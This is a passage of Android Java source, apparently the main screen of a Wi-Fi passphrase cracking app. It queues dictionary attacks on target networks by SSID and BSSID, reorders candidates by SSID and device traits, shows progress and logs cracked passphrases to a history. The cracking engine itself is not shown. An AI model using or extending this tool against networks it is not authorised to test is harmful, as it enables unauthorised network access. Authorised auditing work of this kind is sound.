            Toast.makeText(this, L.s("当前没有正在跑的任务", "No task is running"),
                    Toast.LENGTH_SHORT).show();
            return;
        }
        // **先改队列**，再通知服务。顺序很重要：
        // 队列是 UI 的唯一真相，先改这里，用户点完立刻能看到状态变化，
        // 不会出现「点了没反应，过几秒才停」的观感。
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING
                    || t.state == TaskQueue.State.PENDING
                    || t.state == TaskQueue.State.PAUSED) {
                t.state = TaskQueue.State.STOPPED;
                TaskQueue.update(this, t);
            }
        }
        // 再让工作线程退出当前那条。
        // 它会阻塞到当前候选等完（每条最多几秒），
        // 但队列状态已经是停止，界面不会再显示"进行中"。
        CrackService svc = liveService();
        if (svc != null) {
            svc.stopAll();
        }
        CrackService st = CrackService.get();
        if (st != null && st != svc) st.stopAll();
        appendStreamColored(L.s("■ 正在中止…", "■ Stopping…"), DANGER);
        refreshQueue();
    }

    /**
     * 从「权威」重建 目标 / 字典 的**显示状态**（2026-10-24 反馈修复）。
     *
     * <h3>原来的问题</h3>
     * 目标与字典只存在 Activity 的内存字段里。系统在后台把 Activity 回收、
     * 用户再回来（或暂停后继续）时，Activity 是新建的：字段为空 →
     * 顶上两张卡显示「未选择目标 / 未选择字典」，而服务其实正拿着它们跑。
     * 这是**显示没有单一权威**的典型症状：真实的权威（服务 + 持久化队列）
     * 一直好好的，只有界面自己忘了。
     *
     * <h3>现在的做法（权威 + 派生显示）</h3>
     * <ol>
     *   <li><b>目标</b>：内存里没有 → 取「服务正在跑的任务」，再退到「队列里第一个
     *       RUNNING/PAUSED 任务」，用 {@code task.toNetRecord()} 还原；</li>
     *   <li><b>字典</b>：优先直接用**服务正在使用的**那份候选列表（与引擎同源，
     *       零成本）；服务不在或没在跑，就用任务里的 {@code dictName/dictSize}
     *       先把名字与条数显示出来，同时**后台**按 {@code dictPath} 读盘补齐列表
     *       （列表还要给「开始」用，所以必须补，但不该卡住界面）；</li>
     *   <li><b>只在缺失时才覆盖</b>：用户本次已经选好的目标/字典绝不被动过 ——
     *       否则「我明明选了别的」会被运行中的任务顶掉。</li>
     * </ol>
     * 本方法是幂等的，可以在绑定服务、队列变化、回前台、切回本页时重复调用。
     */
    private void restoreSelectionFromAuthority() {
        // ① 目标
        if (targetNet == null || targetNet.ssid == null || targetNet.ssid.isEmpty()) {
            TaskQueue.Task t = activeTaskForDisplay();
            if (t != null && t.ssid != null && !t.ssid.isEmpty()) {
                try {
                    targetNet = t.toNetRecord();
                    Prefs.setTarget(this, targetNet.bssid, targetNet.ssid);
                    updateTargetLabel();
                    refreshSkippedForCurrentDict();
                } catch (Throwable ignored) {}
            }
        }

        // ② 字典
        if ((currentDict == null || currentDict.isEmpty()) && !dictReloading) {
            CrackService svc = liveService();
            java.util.List<Candidate> engineDict = svc == null ? null : svc.dictForDisplay();
            if (engineDict != null && !engineDict.isEmpty()) {
                // 与引擎同一份：直接采用（这就是权威）
                currentDict = engineDict;
                dictSizeShown = engineDict.size();
                TaskQueue.Task t = svc.current();
                if (t != null) {
                    if (currentDictName == null || currentDictName.isEmpty()) {
                        currentDictName = t.dictName == null ? "" : t.dictName;
                    }
                    if (currentDictPath == null || currentDictPath.isEmpty()) {
                        currentDictPath = t.dictPath == null ? "" : t.dictPath;
                    }
                }
            } else {
                TaskQueue.Task t = activeTaskForDisplay();
                if (t != null) {
                    if (currentDictName == null || currentDictName.isEmpty()) {
                        currentDictName = t.dictName == null ? "" : t.dictName;
                    }
                    if (currentDictPath == null || currentDictPath.isEmpty()) {
                        currentDictPath = t.dictPath == null ? "" : t.dictPath;
                    }
                    if (t.dictSize > 0) dictSizeShown = t.dictSize;

                    final String path = currentDictPath;
                    final String name = currentDictName;
                    if (path != null && !path.isEmpty()) {
                        dictReloading = true;
                        new Thread(() -> {
                            java.util.List<Candidate> reloaded = null;
                            try {
                                reloaded = io.github.wlmosv_png.wpaforge.audit.DictStore.load(
                                        new java.io.File(path), 0);
                            } catch (Throwable ignored) {}
                            final java.util.List<Candidate> r = reloaded;
                            ui.post(() -> {
                                dictReloading = false;
                                if (r != null && !r.isEmpty()
                                        && (currentDict == null || currentDict.isEmpty())) {
                                    currentDict = r;
                                    dictSizeShown = r.size();
                                    currentDictName = name;
                                }
                                updateConnectDict();
                                updateDictStatus();
                            });
                        }, "wpaforge-dict-reload").start();
                    }
                }
            }
        }

        updateTargetLabel();
        updateConnectDict();
        updateConnectMode();
        updateDictStatus();
    }

    /**
     * 显示用的「活动任务」：正在跑的优先，其次队列里第一个 RUNNING/PAUSED。
     * <p>只用于重建显示；不改队列、不改任何状态。
     */
    private TaskQueue.Task activeTaskForDisplay() {
        CrackService svc = liveService();
        if (svc != null) {
            TaskQueue.Task cur = svc.current();
            if (cur != null) return cur;
        }
        for (TaskQueue.Task t : queueCache) {
            if (t.state == TaskQueue.State.RUNNING || t.state == TaskQueue.State.PAUSED) return t;
        }
        return null;
    }

    /** 执行方式：仅 Root，点击只弹提示 */
    /** 空状态提示 */
    private void updateEmptyHint() {
        if (connectEmptyHint == null) return;
        boolean empty = streamBuffer.length() == 0;
        // （SpannableStringBuilder 同样有 length()，无需改动语义）
        connectEmptyHint.setVisibility(empty ? View.VISIBLE : View.GONE);
        if (empty) {
            if (!streamLines.isEmpty()) {
                // 有日志、但当前级别把它们全筛掉了 —— 这跟「没有日志」是两回事，
                // 不能让用户以为任务没在动。
                connectEmptyHint.setText(L.s(
                        "已按「关键」筛选\n共 " + streamLines.size() + " 行 · 点「全部」查看",
                        "Filtered to Key\n" + streamLines.size()
                                + " lines · tap “All” to view"));
            } else {
                boolean ready = targetNet != null && currentDict != null && !currentDict.isEmpty();
                // 空状态里带一句「看原理」—— 还没跑过的人最需要它
                connectEmptyHint.setText((ready
                        ? L.s("准备就绪\n点下面的「▶ 开始」",
                                "Ready\nTap “▶ Start” below")
                        : L.s("先选目标和字典\n（点上面两行可以更换）",
                                "Pick a target and a dictionary first\n(tap the lines above to change)"))
                        + L.s("\n\n右上角「?」看它是怎么破解的",
                                "\n\nTap “?” at the top right to see how it works"));
            }
        }
    }

    /** 智能排序开关外观 */
    private void updateSmartToggle() {
        if (smartToggle == null) return;
        if (smartSortEnabled) {
            smartToggle.setText("智能排序: 已开启\n"
                    + L.s("按目标 SSID 与设备特征重排，让最可能的口令排在最前", "Reorder by target SSID and device traits so the likeliest passphrases come first"));
            smartToggle.setTextColor(OK_GREEN);
            smartToggle.setBackground(roundBg(AmberTheme.OK_BG, AmberTheme.RADIUS_CARD));
        } else {
            smartToggle.setText("智能排序: 已关闭\n"
                    + L.s("按字典原始顺序依次尝试", "Try in the dictionary's original order"));
            smartToggle.setTextColor(TEXT_DIM);
            smartToggle.setBackground(roundBgStroked(SURFACE, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        }
    }

    /** 目标派生开关外观 */
    private void updateTargetDictToggle() {
        if (targetDictToggle == null) return;
        if (targetDictEnabled) {
            targetDictToggle.setText("目标派生: 已开启\n"
                    + L.s("按 SSID 与设备特征现场造候选，排在最前面尝试", "Generate candidates from the SSID and device traits, tried first"));
            targetDictToggle.setTextColor(OK_GREEN);
            targetDictToggle.setBackground(roundBg(AmberTheme.OK_BG, AmberTheme.RADIUS_CARD));
        } else {
            targetDictToggle.setText("目标派生: 已关闭\n"
                    + L.s("只用字典里已有的候选", "Use only candidates already in the dictionary"));
            targetDictToggle.setTextColor(TEXT_DIM);
            targetDictToggle.setBackground(roundBgStroked(SURFACE, AmberTheme.EDGE, AmberTheme.RADIUS_CARD, 0.8f));
        }
    }

    /** 破解页显示当前模式 */
    /**
     * 破解页那一行「通道 · 速度」。
     *
     * 只有一种通道（Root），所以不写「执行方式:」暗示可切换。
     *
     * 这一行不可点。可用性由上面的设置页实时检测负责，
     * 这里只报「用什么通道 + 实测多快」。
     */
    private void updateConnectMode() {
        if (connectModeView == null) return;
        // 用「每条约 X 秒」而不是「X 条/秒」。
        // 0.1 条/秒看着像「没在动」，换算成「每条约 10 秒」
        // 用户才知道该等多久 —— 后者才是他真正关心的信息。
        //
        // 数字来源分两种，必须说清楚是哪种：
        //   · 任务在跑 → **本次任务的实时实测值**（引擎的净尝试耗时 / 已试条数）
        //   · 没在跑   → 上一次的滚动平均，标注「上次」，不再冒充本次
        long live = 0;
        CrackService svc = liveService();
        if (svc != null) live = svc.currentRateMs();
        // 口径要写清楚（这是最近 20 条的实时节奏，不是整轮平均），但**不能写太长** ——
        // 这一行在真机上会被 ellipsize 截成「（近 20…」（2026-10-24 用户截图）。
        // 所以：短标签 + 短单位；同时允许折两行兜底（窄屏/大字号不会再被切掉）。
        if (live > 0) {
            connectModeView.setText(L.f("Root 通道 · %.1f 秒/条 · 近 20 条",
                    "Root channel · %.1fs/attempt · last 20",
                    live / 1000.0));
        } else {
            long ms = Prefs.avgMsPerItem(this);
            connectModeView.setText(L.f("Root 通道 · 上次 %.1f 秒/条",
                    "Root channel · %.1fs/attempt (last run)",
                    ms / 1000.0));
        }
        connectModeView.setTextColor(ACCENT);
    }

    /** 破解页显示当前选中的字典 */
    private void updateConnectDict() {
        if (connectDictView == null) return;
        int n = dictCount();
        if (n <= 0) {
            connectDictView.setText(L.s("未选择字典 —— 点这里选择",
                    "No dictionary — tap to select"));
            connectDictView.setTextColor(TEXT_DIM);
        } else {
            String name = (currentDictName == null || currentDictName.isEmpty())
                    ? L.s("字典", "Dictionary") : currentDictName;
            connectDictView.setText(name + "   ·   " + n + L.s(" 条", " entries"));
            connectDictView.setTextColor(OK_GREEN);
        }
        updateEmptyHint();
    }

    /**
     * 字典条数：优先用内存里的候选列表，其次用从权威恢复出来的显示值。
     * <p>这样「后台跑着 → 回前台」时，即使候选列表还在后台读盘，
     * 界面上也不会显示成「未选择字典」。
     */
    private int dictCount() {
        if (currentDict != null && !currentDict.isEmpty()) return currentDict.size();
        return Math.max(0, dictSizeShown);
    }

    /** 服务状态回调 */
    private final CrackService.UiCallback svcCallback = new CrackService.UiCallback() {
        @Override
        public void onQueueChanged(java.util.List<TaskQueue.Task> queue) {
            ui.post(() -> {
                queueCache.clear();
                queueCache.addAll(queue);
                renderQueue();
                renderProgressCardState();   // 同上：队列变了就重画状态行
                // 队列是持久化权威：界面被重建后靠它把「目标/字典」的显示补回来
                restoreSelectionFromAuthority();
            });
        }

        @Override
        public void onAttempt(int index, int total, String candidate) {
            // 只更新「当前候选」那一行文字。
            //
            // 进度条本身**不在这里画** —— onAttempt 用的 index 与
            // onProgress 用的 tested 是两套计数，交替刷新会让进度条来回跳。
            // 统一由 onProgress 负责，这里只报当前在试什么。
            ui.post(() -> {
                curCandIndex = index;
                // 总条数在第一条候选开始时就已经确定（服务传进来的 total），
                // 这里只是把它显示出来 —— 不额外查询、不重新统计。
                if (statTotalView != null && total > 0) {
                    statTotalView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(total));
                }
                renderProgressCardState();
                // 方案 A：候选不再塞在进度条脚下的小字里，
                // 而是独立的「正在试」区（等宽大字 + 上两条）。
                candTicker.push(candidate);
                renderCandidates();
                if (connectProgress != null) {
                    connectProgress.setVisibility(View.VISIBLE);
                    // 首帧也得给个形：stages 为空时 onMeasure 只给 dp(20)，
                    // 轨道画不全（表现为「第一条候选没有进度条」）。
                    float p = total > 0 ? (float) (index - 1) / total : 0f;
                    java.util.List<io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage> s0 =
                            new java.util.ArrayList<>();
                    s0.add(new io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage(
                            p, io.github.wlmosv_png.wpaforge.ui.CrackHud
                                    .percentLabel(index - 1, total)));
                    connectProgress.setStages(s0);
                    connectProgress.setDone(false);
                    // **不要在这里 setText** —— 进度文字只归 onProgress 管。
                    // 我先前的版本在这里写了一次空标题，结果 onProgress 刚写上的
                    // 「还剩多久」在下一条候选开始时又被清掉，界面上大部分时间空着
                    // （2026-10-24 实机反馈「大字不显示」）。
                }
            });
        }

        @Override
        public void onAttemptResult(String candidate, boolean hit, long ms, String detail) {
            ui.post(() -> {
                if (hit) {
                    appendStreamColored("✓ 成功  "
                            + io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(curCandIndex, candidate)
                            + "  (" + ms + "ms " + detail + ")", OK_GREEN);
                    showHitCard(candidate, ms, detail);
                } else {
                    appendStreamDetail("✗  "
                            + io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(curCandIndex, candidate)
                            + "  (" + ms + "ms " + detail + ")", TEXT_DIM);
                }
                // 每条都刷新状态行的实时速率 —— 否则用户看到的一直是上一个任务的数字
                updateConnectMode();
            });
        }

        @Override
        public void onProgress(int tested, int total, double rate, long etaMs) {
            ui.post(() -> {
                lastTested = tested;
                lastTotal = total;
                if (connectProgress == null) return;
                connectProgress.setVisibility(View.VISIBLE);
                float outer = total > 0 ? (float) tested / total : 0f;
                // 方案 A：进度只留一条轨道（原来三条轨道把同一件事说了三遍），
                // 主视觉是「剩多久」，副标题是「已试多少 · 多快」。
                java.util.List<io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage> st =
                        new java.util.ArrayList<>();
                st.add(new io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage(
                        outer, io.github.wlmosv_png.wpaforge.ui.CrackHud.percentLabel(tested, total)));
                connectProgress.setStages(st);
                connectProgress.setDone(false);
                /* 进度条上只留「还剩多久」这一行大字；脚注不再重复写。
                 * 上一版条里写「56 / 60 · 17 条/分」，卡片下面又写一遍
                 * 「17 条/分 … 剩 13 秒」——同一屏两组一模一样的数字。 */
                connectProgress.setText(
                        io.github.wlmosv_png.wpaforge.ui.CrackHud.etaLabel(etaMs),
                        "");

                // Obsidian Amber：同一组数字再喂给「大数字区」。
                // **不重新计算任何东西** —— tested/total/rate/etaMs 全部是服务
                // 在这次回调里传进来的原始值，格式化仍走既有的 CrackHud。
                // 速率/剩余拿不到时显示「待测/待估」，不编一个数字出来。
                if (statDoneView != null) {
                    statDoneView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(tested));
                    statDoneView.setTextColor(TEXT);
                }
                if (statTotalView != null) {
                    statTotalView.setText(io.github.wlmosv_png.wpaforge.ui.CrackHud
                            .thousands(total));
                    statTotalView.setTextColor(TEXT);
                }
                if (statPctView != null) {
                    boolean known = total > 0;
                    statPctView.setText(known
                            ? io.github.wlmosv_png.wpaforge.ui.CrackHud
                                    .percentLabel(tested, total)
                            : "—");
                    statPctView.setTextColor(known ? ACCENT : AmberTheme.TEXT_FAINT);
                }
                if (statRateView != null) {
                    String rl = io.github.wlmosv_png.wpaforge.ui.CrackHud.ratePerMin(rate);
                    statRateView.setText(rl.isEmpty()
                            ? L.s("速率 待测", "rate —") : rl);
                }
                if (statEtaView != null) {
                    // 运行期间「剩多久」只由进度条上那行大字承担，这里留空避免重复
                    statEtaView.setText("");
                }
                // 候选跑完了但还没收到"结束"回调 → 收尾中（恢复临时网络配置等）
                boolean nowFinishing = total > 0 && tested >= total;
                if (nowFinishing && !finishingNow) {
                    // 第一次进入收尾：把进度条收掉。
                    // 它已经没有信息可给（100% 了），留着只会继续放流动效 ——
                    // 那正是用户说的"跑完了进度条还在动，像卡住"。
                    finishingStartedAt = System.currentTimeMillis();
                    if (connectProgress != null) {
                        connectProgress.setDone(false);
                        connectProgress.setVisibility(View.GONE);
                    }
                    ui.removeCallbacks(finishingTick);
                    ui.post(finishingTick);
                }
                finishingNow = nowFinishing;
                renderProgressCardState();
            });
        }

        @Override
        public void onTaskDone(TaskQueue.Task task, String hitPassword, String outcome) {
            /* 这个回调是**服务的工作线程**（wpaforge-crack）调进来的，
             * 所以这里**一个字都不许碰 View**。
             *
             * <p>线上抓到的第二次崩溃就是这个：
             * {@code CalledFromWrongThreadException: Expected main, Calling wpaforge-crack}
             * —— 我把 finishNote.setVisibility / showResultCard 写在了 ui.post 外面。
             * 所有界面动作一律进 ui.post，没有例外。 */
            ui.post(() -> {
                finishingNow = false;
                ui.removeCallbacks(finishingTick);
                if (finishNote != null) finishNote.setVisibility(View.GONE);
                /* 界面代码抛异常**不能**把状态机留在"收尾中"：
                 * 上一轮就是 showResultCard 里 NPE → 后面的
                 * renderProgressCardState 没执行 → 界面永远停在收尾中。 */
                try {
                    showResultCard(task, outcome);
                } catch (Throwable t) {
                    appendStreamColored(L.s("结算卡显示失败（不影响破解结果）: ",
                            "result card failed (result unaffected): ") + t, DANGER);
                }
                // 只用于显示：把服务报回来的真实结论记下来给进度卡的状态行用。
                // 这里**不判定**成功/失败，只是把 outcome 换个说法展示。
                lastOutcomeLabel = "DONE_HIT".equals(outcome)
                        ? L.s("已命中", "Hit")
                        : "PAUSED".equals(outcome)
                            ? L.s("已暂停 · 进度已保留", "Paused · progress kept")
                            : "STOPPED".equals(outcome)
                                ? L.s("已停止", "Stopped")
                                : L.s("已结束 · 未命中", "Finished · no match");
                lastOutcomeColor = "DONE_HIT".equals(outcome) ? OK_GREEN
                        : "STOPPED".equals(outcome) ? DANGER : io.github.wlmosv_png
                                .wpaforge.ui.AmberTheme.TEXT_DIM;
                histSummary = null;      // 有新记录，让统计缓存失效
                if ("DONE_HIT".equals(outcome)) {
                    appendStreamColored(L.s("⚡ 密钥命中 ", "★ HIT!") + task.ssid + " = "
                            + io.github.wlmosv_png.wpaforge.ui.Redact.pwAt(curCandIndex, hitPassword),
                            OK_GREEN);
                    Toast.makeText(MainActivity.this,
                            L.s("破解成功: ", "Cracked: ") + task.ssid, Toast.LENGTH_LONG).show();
                    // 记一笔历史
                    HistStore.append(MainActivity.this, new HistStore.Record(
                            System.currentTimeMillis(), task.ssid, task.bssid,
                            task.dictName, task.dictSize, task.testedThisRun,
                            task.elapsedMs, true, hitPassword));
                } else if ("PAUSED".equals(outcome)) {
                    appendStreamColored(L.s("已挂起（现场 ", "Paused (progress ") + task.offset + "/" + task.dictSize
                            + L.s("，可继续）", ", resumable)"), ACCENT);
                    // 暂停也不能让用户断网等着 —— 之前只有「中止」才恢复
                    restoreWifiAfterRun();
                } else if ("STOPPED".equals(outcome)) {
                    appendStreamColored(L.s("已中止（现场 ", "Stopped (progress ") + task.offset + "/" + task.dictSize + "）", DANGER);
                    restoreWifiAfterRun();
                } else {
                    appendStream(L.s("任务结束: ", "Task finished: ") + task.ssid + " 未命中");
                    restoreWifiAfterRun();
                    HistStore.append(MainActivity.this, new HistStore.Record(
                            System.currentTimeMillis(), task.ssid, task.bssid,
                            task.dictName, task.dictSize, task.testedThisRun,
                            task.elapsedMs, false, null));
                }
                // 进度条收尾：命中整条变绿，停止清空
                if (connectProgress != null) {
                    if ("DONE_HIT".equals(outcome)) {
                        java.util.List<io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage> fs =
                                new java.util.ArrayList<>();
                        for (int i = 0; i < 3; i++) {
                            fs.add(new io.github.wlmosv_png.wpaforge.ui.StagedProgress.Stage(1f, ""));
                        }
                        connectProgress.setStages(fs);
                        connectProgress.setDone(true);
                        connectProgress.setText(
                                L.s("★ 命中", "★ HIT"),
                                task.ssid + " = " + (hitPassword == null ? "" : hitPassword));
                    } else if ("STOPPED".equals(outcome)) {
                        connectProgress.setDone(false);
                        connectProgress.setStages(new java.util.ArrayList<>());
                        connectProgress.setText(
                                L.s("已停止", "Stopped"), "");
                        connectProgress.setVisibility(View.GONE);
                        // 停止后「剩余」不再有意义；已完成/总数/完成度保留真实值
                        if (statEtaView != null) statEtaView.setText(L.s("剩余 已中止", "ETA —"));
                        if (statRateView != null) statRateView.setText(L.s("速率 已中止", "rate —"));
                    } else {
                        /* 未命中（及其它终态）：**把进度条收掉**。
                         * 旧版这里没有分支 → 跑完仍停在"100% + 流光动画 + 运行中"，
                         * 用户盯着它等一个永远不会来的结果，然后觉得是垃圾。
                         * 结论交给结算卡说，进度条没必要留在屏幕上继续转。 */
                        connectProgress.setDone(false);
                        connectProgress.setStages(new java.util.ArrayList<>());
                        connectProgress.setText("", "");
                        connectProgress.setVisibility(View.GONE);
                        if (statEtaView != null) statEtaView.setText(L.s("剩余 —", "ETA —"));
                        if (statRateView != null) {
                            statRateView.setText(L.s("速率 已结束", "rate —"));
                        }
                    }
                }
                renderProgressCardState();
                refreshQueue();
            });
        }

        @Override
        public void onLog(String line) {
            ui.post(() -> appendStream(line));
        }

        @Override
        public void onRestoreDone(String summary) {
            ui.post(() -> lastRestoreSummary = summary == null ? "" : summary);
        }
    };

    /** 破解页的候选流日志。切页签会重建界面，所以文本要留在字段里。 */
    /**
     * 日志缓冲。用 SpannableStringBuilder 而不是 StringBuilder ——
     * 每行要带自己的颜色，不能靠 TextView.setTextColor 统一着色
     * （那样最后一行的颜色会覆盖整个日志区，历史行颜色全被抹掉）。
     */
    private final android.text.SpannableStringBuilder streamBuffer =
            new android.text.SpannableStringBuilder();

    /** 渲染队列。会保留主滚动位置，避免列表更新后页面乱跳。 */
    private void renderQueue() {
        if (queueBox == null) return;
        final int keepY = mainScroll != null ? mainScroll.getScrollY() : 0;
        queueBox.removeAllViews();

        if (queueCache.isEmpty()) {
            // 没任务时不占位置 —— 空的时候放一块提示反而乱
            //
            // 同时把顶部进度条一并收起来。
            // 否则用户把任务全删了，那三根条还挂在那里，
            // 看起来像还在跑 **且进度不动** —— 很像死机。
            if (connectProgress != null) {
                connectProgress.setDone(false);
                connectProgress.setStages(new java.util.ArrayList<>());
                connectProgress.setText("", "");
                connectProgress.setVisibility(View.GONE);
            }
            syncButtons();
            restoreScroll(keepY);
            return;
        }

        // 任务多于 1 个才显示汇总条
        if (queueCache.size() > 1) {
            queueBox.addView(summaryBar());
        }
        for (TaskQueue.Task task : queueCache) {
            queueBox.addView(taskCard(task));
        }
        syncButtons();
        restoreScroll(keepY);
    }

    /**
     * 恢复主滚动位置。
     *
     * 必须 clamp 到内容实际高度内 —— 队列变短后旧位置可能超出，
     * 会出现整页空白（看起来像"什么都没了"）。
     */
    private void restoreScroll(int y) {
        if (mainScroll == null || y <= 0) return;
        mainScroll.post(() -> {
            if (mainScroll.getChildCount() == 0) return;
            int contentH = mainScroll.getChildAt(0).getHeight();
            int viewH = mainScroll.getHeight();
            int max = Math.max(0, contentH - viewH);
            mainScroll.scrollTo(0, Math.min(y, max));
        });
    }

    /** 队列汇总条（只在多任务时出现） */
    private View summaryBar() {
        int running = 0, paused = 0, pending = 0, done = 0;
        for (TaskQueue.Task t : queueCache) {
            switch (t.state) {
                case RUNNING: running++; break;
                case PAUSED: paused++; break;
                case PENDING: pending++; break;
                default: done++; break;
            }
        }
        StringBuilder sb = new StringBuilder();
        if (running > 0) sb.append("● ").append(running).append("   ");
        if (paused > 0) sb.append("‖ ").append(paused).append("   ");
        if (pending > 0) sb.append("○ ").append(pending).append("   ");
        if (done > 0) sb.append("✓ ").append(done);

        TextView t = new TextView(this);
        t.setText(sb.toString().trim());
        t.setTextSize(12);
        t.setTextColor(running > 0 ? OK_GREEN : (paused > 0 ? AMBER : TEXT_DIM));
        t.setBackground(roundBgStroked(AmberTheme.CARD_2, AmberTheme.EDGE, AmberTheme.RADIUS_CHIP, 0.8f));
        t.setPadding(px(14), px(10), px(14), px(10));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = px(8);
        t.setLayoutParams(lp);
        return t;
    }

    /** 文件名里不允许出现的字符（SSID 可能带这些） */
    private static final String FNAME_BAD = "[\\\\/:*?\"<>|]";
    private static final int AMBER = AmberTheme.ACCENT;
    private static final int PAUSE_BG = AmberTheme.WARN_BG;

    /** 单个任务卡片 */
    private View taskCard(TaskQueue.Task task) {
        // 暂停 / 进行中用不同底色，一眼能分辨
        int cardBg = SURFACE;
        if (task.state == TaskQueue.State.PAUSED) cardBg = PAUSE_BG;
        else if (task.state == TaskQueue.State.RUNNING) cardBg = AmberTheme.OK_BG;

        LinearLayout item = new LinearLayout(this);
        item.setOrientation(LinearLayout.VERTICAL);
        item.setBackground(roundBg(cardBg, AmberTheme.RADIUS_CARD));
        item.setPadding(px(16), px(15), px(16), px(15));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = px(9);
        item.setLayoutParams(lp);

        // 第一行：SSID + 状态徽章
        LinearLayout head = new LinearLayout(this);
        head.setOrientation(LinearLayout.HORIZONTAL);
        head.setGravity(Gravity.CENTER_VERTICAL);

        TextView title = new TextView(this);
        title.setText(task.ssid);
        title.setTextSize(15);
        title.setTextColor(TEXT);
        title.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        title.setSingleLine(true);
        title.setEllipsize(TextUtils.TruncateAt.END);
        head.addView(title, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        TextView badge = new TextView(this);
        badge.setText(badgeText(task.state));
        badge.setTextSize(11);
        badge.setTextColor(badgeFgFor(task));
        badge.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        badge.setBackground(roundBg(badgeBgFor(task), AmberTheme.RADIUS_CHIP));
        badge.setPadding(px(10), px(4), px(10), px(4));
        head.addView(badge);

        item.addView(head);

        // 第二行：BSSID 与信号
        TextView sub = new TextView(this);
        sub.setText(task.bssid + "   " + task.rssi + "dBm");
        sub.setTextSize(10.5f);
        sub.setTextColor(TEXT_DIM);
        sub.setPadding(0, px(5), 0, 0);
        item.addView(sub);

        // 第三行：字典 + 进度
        TextView meta = new TextView(this);
        String hit = task.hitPassword == null || task.hitPassword.isEmpty()
                ? "" : L.f("\n口令: %s", "\nPassphrase: %s", task.hitPassword);
        String modeTag = L.s("Root", "Root");
        meta.setText(L.f("%s 模式\n字典 %s（%s）\n进度 %d / %d%s%s%s",
                "%s mode\nDictionary %s (%s)\nProgress %d / %d%s%s%s",
                modeTag,
                task.dictName,
                io.github.wlmosv_png.wpaforge.audit.DictRule.formatCount(task.dictSize),
                task.offset, task.dictSize,
                task.testedThisRun > 0
                    ? L.f("   本轮试了 %d 条", "   %d tried this run", task.testedThisRun) : "",
                hit,
                missCaveat(task)));
        meta.setTextSize(11.5f);
        meta.setTextColor(TaskQueue.State.DONE_HIT == task.state ? OK_GREEN : TEXT_DIM);
        meta.setLineSpacing(px(4), 1f);
        meta.setPadding(0, px(8), 0, 0);
        item.addView(meta);

        // 进度条（细线）
        if (task.dictSize > 0) {
            View bar = new View(this);
            android.graphics.drawable.GradientDrawable g =
                    new android.graphics.drawable.GradientDrawable();
            g.setColor(TEXT_DIM);
            g.setCornerRadius(px(2));
            android.graphics.drawable.LayerDrawable ld =
                    new android.graphics.drawable.LayerDrawable(new android.graphics.drawable.Drawable[]{
                            trackDrawable(), progressDrawable(task)});
            bar.setBackground(ld);
            LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, px(3));
            blp.topMargin = px(10);
            item.addView(bar, blp);
        }

        // 暂停时给一句明确提示
        if (task.state == TaskQueue.State.PAUSED) {
            TextView tip = new TextView(this);
            tip.setText(L.f("已暂停在 %d / %d，点「继续」从这里接着跑",
                    "Paused at %d / %d — tap Resume to continue from here",
                    task.offset, task.dictSize));
            tip.setTextSize(11);
            tip.setTextColor(AMBER);
            tip.setPadding(0, px(10), 0, 0);
            item.addView(tip);
        }

        // 操作行
        LinearLayout ops = new LinearLayout(this);
        ops.setOrientation(LinearLayout.HORIZONTAL);
        ops.setPadding(0, px(12), 0, 0);

        switch (task.state) {
            case PAUSED:
                ops.addView(smallChip(L.s("▶ 继续", "▶ Resume"), OK_GREEN, v -> resumeTask(task)));
                break;
            case RUNNING:
                ops.addView(smallChip(L.s("‖ 暂停", "‖ Pause"), AMBER, v -> {
                    if (crackService != null) crackService.pause();
                    appendStreamColored(L.s("正在暂停…（进度会保留）", "Pausing… (progress kept)"), ACCENT);
                }));
                break;
            case PENDING:
                ops.addView(smallChip(L.s("▶ 开始", "▶ Start"), OK_GREEN, v ->
                        CrackService.start(MainActivity.this)));
                break;
            default:
                break;
        }
        ops.addView(smallChip(L.s("移除", "Remove"), DANGER, v -> {
            TaskQueue.remove(this, task.id);
            refreshQueue();
        }));
        item.addView(ops);

        return item;
    }

    private android.graphics.drawable.Drawable trackDrawable() {
        android.graphics.drawable.GradientDrawable g =
                new android.graphics.drawable.GradientDrawable();
        g.setColor(AmberTheme.NEUTRAL_BG);
        g.setCornerRadius(px(2));
        return g;
    }

    /** 已经跑过的那一段 */
    private android.graphics.drawable.Drawable progressDrawable(TaskQueue.Task task) {
        android.graphics.drawable.GradientDrawable g = new android.graphics.drawable.GradientDrawable();
        g.setColor(task.state == TaskQueue.State.DONE_HIT ? OK_GREEN
                : task.state == TaskQueue.State.PAUSED ? AMBER : ACCENT);
        g.setCornerRadius(px(2));
        float p = task.progress();
        g.setBounds(0, 0, (int) (getResources().getDisplayMetrics().widthPixels * p
                - px(64)), px(3));
        return g;
    }

    /**
     * 未命中徽章：有「无结论」条目时换成警示色。
     *
     * <p>语义缺口（2026-10-24 最终审计发现）：一次全部无结论的结束也被写成「未命中」，
     * 读起来像"已证实密码不在字典里"。那种结束**没有证据**证明密码错，所以给警示色，
     * 并在卡片正文里注明无结论条数。
     */
    private int badgeBgFor(TaskQueue.Task task) {
        if (task != null && task.state == TaskQueue.State.DONE_MISS
                && task.missInconclusive > 0) {
            return AmberTheme.WARN_BG;
        }
        return badgeBg(task.state);
    }

    private int badgeFgFor(TaskQueue.Task task) {
        if (task != null && task.state == TaskQueue.State.DONE_MISS
                && task.missInconclusive > 0) {
            return ACCENT;
        }
        return badgeFg(task.state);
    }

